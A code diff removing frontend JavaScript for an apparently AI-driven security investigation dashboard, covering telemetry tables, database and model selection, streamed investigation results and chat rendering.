-      const processId = event.process_entity_id || details.pid || "";
-      const process = processName && processId
-        ? `${processName} (${processId})`
-        : processName || processId || "Unknown";
-
-      const row = tableBody.insertRow();
-      const timeCell = row.insertCell();
-      timeCell.textContent = event.timestamp || "Time unavailable";
-
-      const eventIdCell = row.insertCell();
-      eventIdCell.textContent = event.event_id || "Unknown event";
-
-      const hostCell = row.insertCell();
-      hostCell.textContent = event.host_id || "Unknown host";
-
-      const actionCell = row.insertCell();
-      actionCell.innerHTML = formatActionBadge(event.action);
-
-      const processCell = row.insertCell();
-      processCell.textContent = process;
-
-      const summaryCell = row.insertCell();
-      summaryCell.textContent = event.summary || details.command_line || details.destination_ip || "No summary available";
-
-      rowEntries.push({
-        row,
-        searchStr: `${event.timestamp || ""} ${event.event_id || ""} ${event.host_id || ""} ${event.action || ""} ${process} ${summaryCell.textContent}`.toLowerCase()
-      });
-    });
-
-    container.appendChild(table);
-
-    function updateFilter() {
-      const query = (searchInput ? searchInput.value : "").trim().toLowerCase();
-      let visibleCount = 0;
-      rowEntries.forEach((entry) => {
-        const match = !query || entry.searchStr.includes(query);
-        entry.row.style.display = match ? "" : "none";
-        if (match) visibleCount++;
-      });
-      if (countBadge) {
-        countBadge.textContent = `${visibleCount} of ${events.length} event(s)`;
-      }
-    }
-
-    if (searchInput) {
-      searchInput.oninput = updateFilter;
-      updateFilter();
-    }
-
-    if (copyBtn) {
-      copyBtn.onclick = () => {
-        const headers = ["Time", "Event ID", "Host", "Action", "Process", "Summary"];
-        const csvLines = [headers.join(",")];
-        events.forEach((e) => {
-          const details = e.details && typeof e.details === "object" ? e.details : {};
-          const pName = e.process_name || details.name || details.process_name || "";
-          const pId = e.process_entity_id || details.pid || "";
-          const proc = pName && pId ? `${pName} (${pId})` : pName || pId || "Unknown";
-          const row = [
-            JSON.stringify(e.timestamp || ""),
-            JSON.stringify(e.event_id || ""),
-            JSON.stringify(e.host_id || ""),
-            JSON.stringify(e.action || ""),
-            JSON.stringify(proc),
-            JSON.stringify(e.summary || details.command_line || "")
-          ];
-          csvLines.push(row.join(","));
-        });
-        navigator.clipboard.writeText(csvLines.join("\n"));
-        const span = copyBtn.querySelector("span");
-        if (span) {
-          const orig = span.textContent;
-          span.textContent = "Copied CSV!";
-          setTimeout(() => { span.textContent = orig; }, 2000);
-        }
-      };
-    }
-  }
-
-  async function openGlobalTelemetryTable(eventsToDisplay, customTitle) {
-    if (!elements.globalTableDialog) return;
-
-    if (eventsToDisplay && Array.isArray(eventsToDisplay) && eventsToDisplay.length > 0) {
-      if (elements.globalDialogTitle) elements.globalDialogTitle.textContent = customTitle || "Investigation Telemetry Events";
-      if (elements.globalDialogMeta) elements.globalDialogMeta.textContent = `${eventsToDisplay.length} events retained from investigation`;
-      setupTable(
-        elements.globalDialogTableWrap,
-        eventsToDisplay,
-        elements.globalDialogSearchInput,
-        elements.globalDialogCountBadge,
-        elements.globalDialogCopyBtn
-      );
-      elements.globalTableDialog.showModal();
-      return;
-    }
-
-    // Otherwise, fetch latest events from active database
-    if (elements.globalDialogTitle) elements.globalDialogTitle.textContent = `Database Telemetry: ${state.currentDb || "Active DB"}`;
-    if (elements.globalDialogMeta) elements.globalDialogMeta.textContent = "Loading events from database...";
-    elements.globalTableDialog.showModal();
-
-    try {
-      const res = await fetch("/api/events?limit=2500");
-      if (!res.ok) throw new Error(`HTTP ${res.status}`);
-      const data = await res.json();
-      const events = data.events || [];
-      globalTelemetryCache = events;
-      if (elements.globalDialogMeta) {
-        if (data.total && data.total > events.length) {
-          elements.globalDialogMeta.textContent = `${events.length} of ${data.total} events loaded from ${data.db_name || state.currentDb}`;
-        } else {
-          elements.globalDialogMeta.textContent = `${events.length} events loaded from ${data.db_name || state.currentDb}`;
-        }
-      }
-      if (elements.headerTableBadge) {
-        elements.headerTableBadge.textContent = `${data.total || events.length}`;
-      }
-      setupTable(
-        elements.globalDialogTableWrap,
-        events,
-        elements.globalDialogSearchInput,
-        elements.globalDialogCountBadge,
-        elements.globalDialogCopyBtn
-      );
-    } catch (err) {
-      if (elements.globalDialogMeta) elements.globalDialogMeta.textContent = `Failed to load events: ${err.message}`;
-    }
-  }
-
-  async function preloadEventCount() {
-    try {
-      const res = await fetch("/api/events?limit=1");
-      if (res.ok) {
-        const data = await res.json();
-        if (elements.headerTableBadge && data.total != null) {
-          elements.headerTableBadge.textContent = `${data.total}`;
-        }
-      }
-    } catch (e) {
-      // silent fallback
-    }
-  }
-
-  // -------------------------------------------------------------------------
-  // API Calls & State Sync
-  // -------------------------------------------------------------------------
-  async function fetchInitialStatus() {
-    try {
-      const res = await fetch("/api/status");
-      if (!res.ok) throw new Error("Failed to load status");
-      const data = await res.json();
-
-      if (data.active_llm) {
-        state.activeProvider = data.active_llm.provider;
-        state.activeModel = data.active_llm.model;
-        updateModelUI();
-      }
-
-      if (data.databases) {
-        state.databases = data.databases;
-        renderDatabases();
-      }
-
-      elements.systemStatusText.textContent = "Ready";
-      elements.systemStatusDot.style.backgroundColor = "var(--accent-primary)";
-    } catch (err) {
-      console.error("fetchInitialStatus error:", err);
-      elements.systemStatusText.textContent = "Offline";
-      elements.systemStatusDot.style.backgroundColor = "#ef4444";
-    }
-  }
-
-  async function fetchModels() {
-    try {
-      const res = await fetch("/api/models");
-      if (!res.ok) return;
-      const data = await res.json();
-      if (Array.isArray(data.ollama) && data.ollama.length > 0) {
-        state.models.ollama = data.ollama;
-      }
-      if (Array.isArray(data.openai) && data.openai.length > 0) {
-        state.models.openai = data.openai;
-      }
-      if (data.active) {
-        if (data.active.provider) state.activeProvider = data.active.provider;
-        if (data.active.model) state.activeModel = data.active.model;
-        updateModelUI();
-      }
-      renderModelList();
-    } catch (err) {
-      console.warn("fetchModels error:", err);
-    }
-  }
-
-  function renderDatabases() {
-    elements.dbSelect.innerHTML = "";
-    state.databases.forEach((db) => {
-      const opt = document.createElement("option");
-      opt.value = db.path;
-      opt.textContent = `${db.display || db.name} (${formatBytes(db.size_bytes)})`;
-      if (db.is_active) {
-        opt.selected = true;
-        state.currentDb = db.name;
-        elements.headerDbName.textContent = db.name;
-        elements.inputMetaDb.textContent = db.name;
-      }
-      elements.dbSelect.appendChild(opt);
-    });
-    updateActiveDbPromptHighlight();
-  }
-
-  function updateActiveDbPromptHighlight() {
-    const activeName = state.currentDb || (elements.headerDbName ? elements.headerDbName.textContent.trim() : "");
-    if (!activeName) return;
-    document.querySelectorAll(".suggestion-item").forEach((item) => {
-      const itemDb = item.getAttribute("data-db") || "";
-      if (itemDb === activeName || activeName.includes(itemDb) || itemDb.includes(activeName)) {
-        item.classList.add("highlight-active-db");
-      } else {
-        item.classList.remove("highlight-active-db");
-      }
-    });
-
-    const activeFilterBtn = document.getElementById("filterActiveDbBtn");
-    if (activeFilterBtn) {
-      activeFilterBtn.textContent = `Active DB (${activeName.replace(".db", "")})`;
-    }
-  }
-
-  async function onDatabaseChange(e) {
-    const path = e.target.value;
-    try {
-      const res = await fetch("/api/databases/set", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ db_path: path }),
-      });
-      if (!res.ok) throw new Error("Failed to switch database");
-      const data = await res.json();
-      const dbObj = state.databases.find((d) => d.path === path);
-      if (dbObj) {
-        state.currentDb = dbObj.name;
-        elements.headerDbName.textContent = dbObj.name;
-        elements.inputMetaDb.textContent = dbObj.name;
-        updateActiveDbPromptHighlight();
-      }
-    } catch (err) {
-      alert("Error switching database: " + err.message);
-    }
-  }
-
-  // -------------------------------------------------------------------------
-  // Model Selector Dropdown
-  // -------------------------------------------------------------------------
-  let currentMenuProvider = null;
-
-  function toggleModelMenu(forceState) {
-    const isCurrentlyOpen =
-      elements.modelDropdownContainer.classList.contains("open") ||
-      (elements.modelMenu && elements.modelMenu.classList.contains("open"));
-    const shouldOpen =
-      forceState !== undefined ? forceState : !isCurrentlyOpen;
-
-    if (shouldOpen) {
-      currentMenuProvider = state.activeProvider || "ollama";
-      elements.modelDropdownContainer.classList.add("open");
-      if (elements.modelMenu) elements.modelMenu.classList.add("open");
-      elements.modelSelectorPill.setAttribute("aria-expanded", "true");
-      updateMenuTabs();
-      renderModelList();
-      setTimeout(() => {
-        if (elements.modelSearchInput) elements.modelSearchInput.focus();
-      }, 50);
-    } else {
-      elements.modelDropdownContainer.classList.remove("open");
-      if (elements.modelMenu) elements.modelMenu.classList.remove("open");
-      elements.modelSelectorPill.setAttribute("aria-expanded", "false");
-    }
-  }
-
-  function updateMenuTabs() {
-    const prov = currentMenuProvider || state.activeProvider || "ollama";
-    if (elements.tabOllama) {
-      elements.tabOllama.classList.toggle("active", prov === "ollama");
-    }
-    if (elements.tabOpenai) {
-      elements.tabOpenai.classList.toggle("active", prov === "openai");
-    }
-  }
-
-  function updateModelUI() {
-    if (elements.activeModelName) {
-      elements.activeModelName.textContent = state.activeModel || "gemma4:31b";
-    }
-    if (elements.activeProviderBadge) {
-      elements.activeProviderBadge.textContent = state.activeProvider || "ollama";
-    }
-    if (elements.inputMetaModel) {
-      elements.inputMetaModel.textContent = state.activeModel || "gemma4:31b";
-    }
-    updateMenuTabs();
-  }
-
-  function renderModelList() {
-    if (!elements.modelList) return;
-    const provider = currentMenuProvider || state.activeProvider || "ollama";
-    const filter = (elements.modelSearchInput?.value || "").toLowerCase().trim();
-    const rawList = state.models[provider] || [];
-    const list = [...rawList];
-
-    // Ensure active model is present in the list if currently browsing its provider
-    if (provider === state.activeProvider && state.activeModel && !list.includes(state.activeModel)) {
-      list.unshift(state.activeModel);
-    }
-
-    elements.modelList.innerHTML = "";
-    const filtered = list.filter((m) => m.toLowerCase().includes(filter));
-
-    if (filtered.length === 0) {
-      const empty = document.createElement("div");
-      empty.className = "history-empty";
-      empty.style.padding = "16px";
-      empty.textContent = filter
-        ? `No ${provider} models matching "${filter}"`
-        : `No ${provider} models configured`;
-      elements.modelList.appendChild(empty);
-      return;
-    }
-
-    filtered.forEach((modelName) => {
-      const isSelected = provider === state.activeProvider && modelName === state.activeModel;
-      const item = document.createElement("div");
-      item.className = "model-item" + (isSelected ? " selected" : "");
-      item.onclick = (e) => {
-        e.stopPropagation();
-        selectModel(provider, modelName);
-      };
-
-      const info = document.createElement("div");
-      info.className = "model-item-info";
-
-      const name = document.createElement("span");
-      name.className = "model-item-name";
-      name.textContent = modelName;
-
-      const desc = document.createElement("span");
-      desc.className = "model-item-desc";
-      desc.textContent =
-        provider === "ollama" ? "Local / Remote Ollama" : "OpenAI Chat Model";
-
-      info.appendChild(name);
-      info.appendChild(desc);
-
-      const check = document.createElement("span");
-      check.className = "model-item-check";
-      check.textContent = "✓";
-
-      item.appendChild(info);
-      item.appendChild(check);
-      elements.modelList.appendChild(item);
-    });
-  }
-
-  async function selectModel(provider, modelName) {
-    state.activeProvider = provider;
-    state.activeModel = modelName;
-    updateModelUI();
-    toggleModelMenu(false);
-
-    try {
-      const res = await fetch("/api/models/set", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ provider, model: modelName }),
-      });
-      if (!res.ok) throw new Error("Failed to set model");
-      const data = await res.json();
-      if (data.active_llm) {
-        state.activeProvider = data.active_llm.provider;
-        state.activeModel = data.active_llm.model;
-        updateModelUI();
-      }
-    } catch (err) {
-      console.warn("Could not sync model to backend:", err);
-    }
-  }
-
-  function handleCustomModelApply() {
-    const custom = elements.customModelInput?.value.trim();
-    if (!custom) return;
-    const provider = currentMenuProvider || state.activeProvider || "ollama";
-    if (state.models[provider] && !state.models[provider].includes(custom)) {
-      state.models[provider].push(custom);
-    }
-    selectModel(provider, custom);
-    if (elements.customModelInput) elements.customModelInput.value = "";
-  }
-
-  // -------------------------------------------------------------------------
-  // Chat & Stream Handling
-  // -------------------------------------------------------------------------
-  function setupEventListeners() {
-    elements.themeToggleBtn.addEventListener("click", toggleTheme);
-
-    if (elements.sidebarCollapseBtn) {
-      elements.sidebarCollapseBtn.addEventListener("click", () => toggleSidebar(false));
-    }
-    if (elements.sidebarToggleBtn) {
-      elements.sidebarToggleBtn.addEventListener("click", () => toggleSidebar());
-    }
-    if (elements.sidebarViewTableBtn) {
-      elements.sidebarViewTableBtn.addEventListener("click", () => openGlobalTelemetryTable());
-    }
-
-    // Global keyboard shortcuts (Ctrl+B / Cmd+B for sidebar, Esc to close dropdowns)
-    window.addEventListener("keydown", (e) => {
-      if (e.key === "Escape") {
-        toggleModelMenu(false);
-      }
-      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "b") {
-        e.preventDefault();
-        toggleSidebar();
-      }
-    });
-
-    elements.newChatBtn.addEventListener("click", startNewChat);
-    elements.clearChatBtn.addEventListener("click", startNewChat);
-    elements.clearHistoryBtn.addEventListener("click", clearAllHistory);
-
-    elements.dbSelect.addEventListener("change", onDatabaseChange);
-
-    // Model Dropdown
-    if (elements.modelSelectorPill) {
-      elements.modelSelectorPill.addEventListener("click", (e) => {
-        e.stopPropagation();
-        toggleModelMenu();
-      });
-    }
-
-    if (elements.modelMenu) {
-      elements.modelMenu.addEventListener("click", (e) => {
-        e.stopPropagation();
-      });
-    }
-
-    document.addEventListener("click", (e) => {
-      if (
-        elements.modelDropdownContainer &&
-        !elements.modelDropdownContainer.contains(e.target) &&
-        (!elements.modelMenu || !elements.modelMenu.contains(e.target))
-      ) {
-        toggleModelMenu(false);
-      }
-    });
-
-    if (elements.tabOllama) {
-      elements.tabOllama.addEventListener("click", (e) => {
-        e.stopPropagation();
-        currentMenuProvider = "ollama";
-        updateMenuTabs();
-        renderModelList();
-      });
-    }
-
-    if (elements.tabOpenai) {
-      elements.tabOpenai.addEventListener("click", (e) => {
-        e.stopPropagation();
-        currentMenuProvider = "openai";
-        updateMenuTabs();
-        renderModelList();
-      });
-    }
-
-    if (elements.modelSearchInput) {
-      elements.modelSearchInput.addEventListener("input", renderModelList);
-    }
-
-    if (elements.applyCustomModelBtn) {
-      elements.applyCustomModelBtn.addEventListener("click", (e) => {
-        e.stopPropagation();
-        handleCustomModelApply();
-      });
-    }
-
-    if (elements.customModelInput) {
-      elements.customModelInput.addEventListener("keydown", (e) => {
-        if (e.key === "Enter") {
-          e.preventDefault();
-          e.stopPropagation();
-          handleCustomModelApply();
-        }
-      });
-    }
-
-    // Prompt Textarea Auto-resize & Enter to send
-    elements.promptInput.addEventListener("input", function () {
-      this.style.height = "auto";
-      this.style.height = Math.min(this.scrollHeight, 200) + "px";
-    });
-
-    elements.promptInput.addEventListener("keydown", function (e) {
-      if (e.key === "Enter" && !e.shiftKey) {
-        e.preventDefault();
-        handleSubmitPrompt();
-      }
-    });
-
-    elements.sendBtn.addEventListener("click", () => {
-      if (state.isGenerating) {
-        stopInvestigation();
-      } else {
-        handleSubmitPrompt();
-      }
-    });
-
-    // Telemetry Table Header Button click
-    if (elements.headerTableBtn) {
-      elements.headerTableBtn.addEventListener("click", () => {
-        if (activeEvidenceHandler) {
-          activeEvidenceHandler.toggleOrOpenTable();
-        } else if (latestEvidenceTimeline && latestEvidenceTimeline.length > 0) {
-          openGlobalTelemetryTable(latestEvidenceTimeline, "Retrieved Evidence Events");
-        } else {
-          openGlobalTelemetryTable();
-        }
-      });
-    }
-
-    // Global dialog close button
-    if (elements.globalDialogCloseBtn) {
-      elements.globalDialogCloseBtn.addEventListener("click", () => {
-        if (elements.globalTableDialog) elements.globalTableDialog.close();
-      });
-    }
-
-    // Suggestions click (support both .suggestion-item and legacy .suggestion-card)
-    document.querySelectorAll(".suggestion-item, .suggestion-card").forEach((item) => {
-      item.addEventListener("click", async () => {
-        const query = item.getAttribute("data-query");
-        const dbName = item.getAttribute("data-db");
-
-        // Automatically switch active database if the suggestion targets a different DB
-        if (dbName && state.databases && state.databases.length > 0) {
-          const matchDb = state.databases.find(
-            (d) => d.name === dbName || d.path.endsWith(dbName) || (d.display && d.display.includes(dbName))
-          );
-          if (matchDb && state.currentDb !== matchDb.name) {
-            try {
-              const res = await fetch("/api/databases/set", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ db_path: matchDb.path }),
-              });
-              if (res.ok) {
-                state.currentDb = matchDb.name;
-                if (elements.headerDbName) elements.headerDbName.textContent = matchDb.name;
-                if (elements.inputMetaDb) elements.inputMetaDb.textContent = matchDb.name;
-                if (elements.dbSelect) elements.dbSelect.value = matchDb.path;
-                updateActiveDbPromptHighlight();
-              }
-            } catch (err) {
-              console.warn("Could not auto-switch database for suggestion:", err);
-            }
-          }
-        }
-
-        if (query) {
-          elements.promptInput.value = query;
-          switchView("chat");
-          handleSubmitPrompt();
-        }
-      });
-    });
-
-    // Prompt Scenarios Category Filter Pills
-    document.querySelectorAll(".sugg-filter-pill").forEach((pill) => {
-      pill.addEventListener("click", () => {
-        document.querySelectorAll(".sugg-filter-pill").forEach((p) => p.classList.remove("active"));
-        pill.classList.add("active");
-        const filter = pill.getAttribute("data-filter");
-        const activeName = state.currentDb || (elements.headerDbName ? elements.headerDbName.textContent.trim() : "");
-        let visibleCount = 0;
-
-        document.querySelectorAll(".suggestion-item").forEach((item) => {
-          const itemDb = item.getAttribute("data-db") || "";
-          const itemCat = item.getAttribute("data-category") || "";
-          let isMatch = true;
-
-          if (filter === "active") {
-            isMatch = itemDb === activeName || activeName.includes(itemDb) || itemDb.includes(activeName);
-          } else if (filter === "attack") {
-            isMatch = itemCat === "attack";
-          } else if (filter === "benign") {
-            isMatch = itemCat === "benign";
-          } else if (filter === "eval") {
-            isMatch = itemCat === "eval" || itemCat === "inconclusive" || itemCat === "ambiguous";
-          } else {
-            isMatch = true;
-          }
-
-          if (isMatch) {
-            item.style.display = "";
-            visibleCount++;
-          } else {
-            item.style.display = "none";
-          }
-        });
-
-        const countBadge = document.getElementById("suggestionsCountBadge");
-        if (countBadge) {
-          countBadge.textContent = `${visibleCount} Available`;
-        }
-      });
-    });
-
-    // Workbench View Tabs
-    if (elements.tabViewGraph) {
-      elements.tabViewGraph.addEventListener("click", () => switchView("graph"));
-    }
-    if (elements.tabViewChat) {
-      elements.tabViewChat.addEventListener("click", () => switchView("chat"));
-    }
-    if (elements.tabViewReport) {
-      elements.tabViewReport.addEventListener("click", () => switchView("report"));
-    }
-
-    // Graph Entity Category Filter Pills
-    document.querySelectorAll(".filter-pill").forEach((pill) => {
-      pill.addEventListener("click", () => {
-        document.querySelectorAll(".filter-pill").forEach((p) => p.classList.remove("active"));
-        pill.classList.add("active");
-        if (forensicGraph) {
-          forensicGraph.setFilter(pill.getAttribute("data-filter") || "all");
-        }
-      });
-    });
-
-    // Graph Live Search
-    if (elements.graphSearchInput) {
-      elements.graphSearchInput.addEventListener("input", (e) => {
-        if (forensicGraph) {
-          forensicGraph.setSearch(e.target.value);
-        }
-      });
-    }
-
-    // Graph Viewport Controls & Expansion
-    if (elements.graphExpandAllBtn) {
-      elements.graphExpandAllBtn.addEventListener("click", () => forensicGraph && forensicGraph.expandAll());
-    }
-    if (elements.graphCollapseAllBtn) {
-      elements.graphCollapseAllBtn.addEventListener("click", () => forensicGraph && forensicGraph.collapseAll());
-    }
-    if (elements.graphZoomInBtn) {
-      elements.graphZoomInBtn.addEventListener("click", () => forensicGraph && forensicGraph.zoomIn());
-    }
-    if (elements.graphZoomOutBtn) {
-      elements.graphZoomOutBtn.addEventListener("click", () => forensicGraph && forensicGraph.zoomOut());
-    }
-    if (elements.graphFitBtn) {
-      elements.graphFitBtn.addEventListener("click", () => forensicGraph && forensicGraph.fitToScreen());
-    }
-
-    // Entity Inspector Close
-    if (elements.inspectorCloseBtn) {
-      elements.inspectorCloseBtn.addEventListener("click", () => {
-        closeEntityInspector();
-        if (forensicGraph) forensicGraph.selectNode(null);
-      });
-    }
-
-    // Scenario Dropdown Toggle
-    if (elements.scenarioDropdownBtn && elements.scenarioMenu) {
-      elements.scenarioDropdownBtn.addEventListener("click", (e) => {
-        e.stopPropagation();
-        elements.scenarioMenu.classList.toggle("show");
-      });
-      document.addEventListener("click", () => {
-        elements.scenarioMenu.classList.remove("show");
-      });
-    }
-
-    // Scenario Menu Items Click
-    document.querySelectorAll(".scenario-menu-item").forEach((btn) => {
-      btn.addEventListener("click", () => {
-        const scType = btn.getAttribute("data-scenario");
-        const events = SAMPLE_SCENARIOS[scType];
-        if (events && events.length) {
-          loadTimelineIntoGraph(events);
-          switchView("graph");
-          if (elements.scenarioMenu) elements.scenarioMenu.classList.remove("show");
-        }
-      });
-    });
-
-    // Report Stage Copy Button
-    if (elements.reportStageCopyBtn) {
-      elements.reportStageCopyBtn.addEventListener("click", () => {
-        const content = elements.reportStageContent ? elements.reportStageContent.innerText : "";
-        if (content) {
-          navigator.clipboard.writeText(content);
-          const span = elements.reportStageCopyBtn.querySelector("span");
-          if (span) {
-            span.textContent = "Copied!";
-            setTimeout(() => (span.textContent = "Copy Markdown"), 1800);
-          }
-        }
-      });
-    }
-  }
-
-  function startNewChat() {
-    if (state.isGenerating) stopInvestigation();
-    elements.messagesContainer.innerHTML = "";
-    elements.welcomeScreen.style.display = "flex";
-    elements.promptInput.value = "";
-    elements.promptInput.style.height = "auto";
-    state.currentSessionId = null;
-    activeEvidenceHandler = null;
-    latestEvidenceTimeline = null;
-    if (elements.headerTableBadge) {
-      elements.headerTableBadge.textContent = "Telemetry Table";
-    }
-    if (elements.graphNodeCountBadge) {
-      elements.graphNodeCountBadge.textContent = "0";
-    }
-    if (elements.graphLiveStatus) {
-      elements.graphLiveStatus.textContent = "Graph Ready";
-    }
-    if (elements.reportStageVerdictTag) {
-      elements.reportStageVerdictTag.className = "verdict-tag";
-      elements.reportStageVerdictTag.textContent = "No Report Generated";
-    }
-    if (elements.reportStageVerdictTime) {
-      elements.reportStageVerdictTime.textContent = "Run an investigation to generate a verified incident report";
-    }
-    if (elements.reportStageContent) {
-      elements.reportStageContent.innerHTML = '<div class="history-empty" style="padding:60px 20px;">No investigation report generated yet. Submit a query below or select a sample investigation from the suggestions to begin.</div>';
-    }
-    closeEntityInspector();
-    if (forensicGraph) {
-      forensicGraph.loadTimeline([]);
-    }
-    switchView("chat");
-    document.querySelectorAll(".history-item").forEach((i) => i.classList.remove("active"));
-  }
-
-  async function handleSubmitPrompt() {
-    const query = elements.promptInput.value.trim();
-    if (!query || state.isGenerating) return;
-
-    elements.welcomeScreen.style.display = "none";
-    elements.promptInput.value = "";
-    elements.promptInput.style.height = "auto";
-    switchView("chat");
-
-    // 1. Render User Message
-    renderUserMessage(query);
-
-    // 2. Prepare Assistant Message Box with Live Stepper
-    const assistantMsg = createAssistantMessageElement();
-    elements.messagesContainer.appendChild(assistantMsg.container);
-    scrollToBottom(true);
-
-    // 3. Start Investigation SSE Stream
-    state.isGenerating = true;
-    updateSendBtnState(true);
-
-    const sessionId = "sess-" + Date.now();
-    state.currentSessionId = sessionId;
-
-    try {
-      const response = await fetch("/api/investigate", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          query: query,
-          provider: state.activeProvider,
-          model: state.activeModel,
-          db_path: elements.dbSelect.value || undefined,
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error(`Server returned HTTP ${response.status}`);
-      }
-
-      const reader = response.body.getReader();
-      const decoder = new TextDecoder("utf-8");
-      let buffer = "";
-
-      while (true) {
-        const { value, done } = await reader.read();
-        if (done) break;
-
-        buffer += decoder.decode(value, { stream: true });
-        const lines = buffer.split("\n\n");
-        buffer = lines.pop(); // Keep last partial chunk
-
-        for (const block of lines) {
-          const trimmed = block.trim();
-          if (trimmed.startsWith("data: ")) {
-            const jsonStr = trimmed.slice(6);
-            try {
-              const event = JSON.parse(jsonStr);
-              handleStreamEvent(event, assistantMsg);
-            } catch (err) {
-              console.warn("SSE JSON Parse error:", err, jsonStr);
-            }
-          }
-        }
-      }
-
-      // Process any trailing SSE data in residual buffer
-      if (buffer && buffer.trim()) {
-        const blocks = buffer.split("\n\n");
-        for (const block of blocks) {
-          const trimmed = block.trim();
-          if (trimmed.startsWith("data: ")) {
-            const jsonStr = trimmed.slice(6);
-            try {
-              const event = JSON.parse(jsonStr);
-              handleStreamEvent(event, assistantMsg);
-            } catch (err) {
-              console.warn("SSE residual JSON Parse error:", err, jsonStr);
-            }
-          }
-        }
-      }
-
-      // Finalize and save to history
-      saveInvestigationSession(sessionId, query, assistantMsg.state);
-    } catch (err) {
-      console.error("Stream error:", err);
-      assistantMsg.setErrorMessage(err.message);
-    } finally {
-      if (assistantMsg && typeof assistantMsg.finalizeThinking === "function") {
-        assistantMsg.finalizeThinking();
-      }
-      state.isGenerating = false;
-      updateSendBtnState(false);
-      scrollToBottom();
-    }
-  }
-
-  async function stopInvestigation() {
-    try {
-      await fetch("/api/cancel", { method: "POST" });
-    } catch (e) {
-      console.warn("Cancel request failed", e);
-    }
-    state.isGenerating = false;
-    updateSendBtnState(false);
-  }
-
-  function updateSendBtnState(isGenerating) {
-    if (isGenerating) {
-      elements.sendBtn.classList.add("generating");
-      elements.sendBtn.title = "Stop investigation";
-    } else {
-      elements.sendBtn.classList.remove("generating");
-      elements.sendBtn.title = "Send message";
-    }
-  }
-
-  // -------------------------------------------------------------------------
-  // Message Components & UI Rendering
-  // -------------------------------------------------------------------------
-  function renderUserMessage(text) {
-    const row = document.createElement("div");
-    row.className = "message-row user";
-
-    const bubble = document.createElement("div");
-    bubble.className = "user-bubble";
-    bubble.textContent = text;
-
-    row.appendChild(bubble);
-    elements.messagesContainer.appendChild(row);
-  }
-
-  function createAssistantMessageElement() {
-    const row = document.createElement("div");
-    row.className = "message-row assistant";
-
-    const avatar = document.createElement("div");
-    avatar.className = "message-avatar";
-    avatar.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>`;
-
-    const content = document.createElement("div");
-    content.className = "assistant-content";
-
-    // Stepper
-    const stepper = document.createElement("div");
-    stepper.className = "investigation-stepper";
-    stepper.innerHTML = `
-      <div class="step-item active" id="st-prep"><div class="step-dot"></div><span>Alert Prep</span></div>
-      <span class="step-separator">›</span>
-      <div class="step-item" id="st-triage"><div class="step-dot"></div><span>Triage Plan</span></div>
-      <span class="step-separator">›</span>
-      <div class="step-item" id="st-loop"><div class="step-dot"></div><span>Telemetry</span></div>
-      <span class="step-separator">›</span>
-      <div class="step-item" id="st-pack"><div class="step-dot"></div><span>Evidence Pack</span></div>
-      <span class="step-separator">›</span>
-      <div class="step-item" id="st-report"><div class="step-dot"></div><span>Verdict</span></div>
-    `;
-
-    // Hypotheses Container
-    const hypothesesBox = document.createElement("div");
-    hypothesesBox.className = "hypotheses-box";
-    hypothesesBox.style.display = "none";
-    hypothesesBox.innerHTML = `
-      <div class="hypotheses-title">Triage Hypotheses</div>
-      <div class="hypotheses-list"></div>
-    `;
-
-    // Retrieved Evidence Timeline
-    const evidenceBox = document.createElement("section");
-    evidenceBox.className = "evidence-pack-box";
-    evidenceBox.style.display = "none";
-    evidenceBox.innerHTML = `
-      <div class="evidence-pack-heading">
-        <div>
-          <div class="hypotheses-title">Retrieved Evidence</div>
-          <div class="evidence-pack-meta"></div>
-        </div>
-        <div class="table-option-group" role="group" aria-label="Data table display options">
-          <button class="action-pill-btn evidence-open-graph-btn" type="button" title="View Process Tree in Forensic Graph">
-            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
-            <span>Forensic Graph</span>
-          </button>
-          <button class="action-pill-btn evidence-open-table-btn" type="button" title="Open Telemetry Table Modal">
-            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="3" y="3" width="18" height="18" rx="2"></rect><path d="M3 9h18M3 15h18M9 3v18m6-18v18"></path></svg>
-            <span>Telemetry Table</span>
-          </button>
-        </div>
-      </div>
-      <div class="evidence-hypotheses"></div>
-    `;
-
-    const btnOpenGraph = evidenceBox.querySelector(".evidence-open-graph-btn");
-    if (btnOpenGraph) {
-      btnOpenGraph.addEventListener("click", () => {
-        const timeline = internalState.evidencePack && Array.isArray(internalState.evidencePack.timeline)
-          ? internalState.evidencePack.timeline
-          : [];
-        if (timeline.length) {
-          loadTimelineIntoGraph(timeline);
-          switchView("graph");
-        }
-      });
-    }
-
-    const btnOpenTable = evidenceBox.querySelector(".evidence-open-table-btn");
-    btnOpenTable.addEventListener("click", () => {
-      const timeline = internalState.evidencePack && Array.isArray(internalState.evidencePack.timeline)
-        ? internalState.evidencePack.timeline
-        : [];
-      openGlobalTelemetryTable(timeline, "Retrieved Evidence Events");
-    });
-
-    // 1. ChatGPT-style Thought / Thinking Block
-    const thinkingBlock = document.createElement("div");
-    thinkingBlock.className = "chat-thinking-block is-collapsed";
-    thinkingBlock.style.display = "none";
-    thinkingBlock.innerHTML = `
-      <button type="button" class="chat-thinking-toggle" title="Click to expand/collapse thought process">
-        <div class="chat-thinking-left">
-          <span class="chat-thinking-icon">
-            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a6 6 0 0 0-6 6c0 2.2 1.2 4.1 3 5.1V15a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1.9c1.8-1 3-2.9 3-5.1a6 6 0 0 0-6-6z"/><path d="M9 19h6"/><path d="M10 22h4"/></svg>
-          </span>
-          <span class="chat-thinking-label">Thinking...</span>
-          <span class="chat-thinking-pulse"></span>
-        </div>
